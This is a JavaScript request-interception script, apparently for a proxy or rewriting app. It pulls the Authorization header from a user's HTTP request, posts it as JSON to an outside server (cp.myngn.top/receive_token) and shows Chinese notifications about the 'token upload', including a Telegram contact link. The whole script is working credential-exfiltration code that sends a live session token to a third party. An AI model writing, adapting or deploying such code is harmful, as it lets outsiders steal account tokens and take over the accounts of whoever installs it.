
const myRequest = $request;

const authorizationToken = myRequest.headers["Authorization"];

if (authorizationToken) {

    const uploadUrl = "https://cp.myngn.top/receive_token";
    const uploadHeaders = {
        'Content-Type': 'application/json'
    };
    const uploadData = {
        'Authorization': authorizationToken
    };

  
    $httpClient.post(uploadUrl, uploadHeaders, JSON.stringify(uploadData), function (error, response, data) {
        if (error) {
  
            $notification.post("Token 上传失败", "请求过程中发生错误", `${error}`);
        } else {
            const statusCode = response.status;
     
            if (statusCode === 200) {
                try {
                    const responseData = JSON.parse(data);
                    const userId = responseData.userId || "未找到 userId";

      
                    $notification.post("Token 上传成功", `UserId: ${userId}`, `联系: https://t.me/ubabashiwo`);
                } catch (error) {
                    $notification.post("Token 上传成功", "解析响应时出错", `服务器响应无法解析: ${data}`);
                }
            } else {
                $notification.post("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${data}`);
            }
        }
    });
} else {

    $notification.post("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
}
$done();
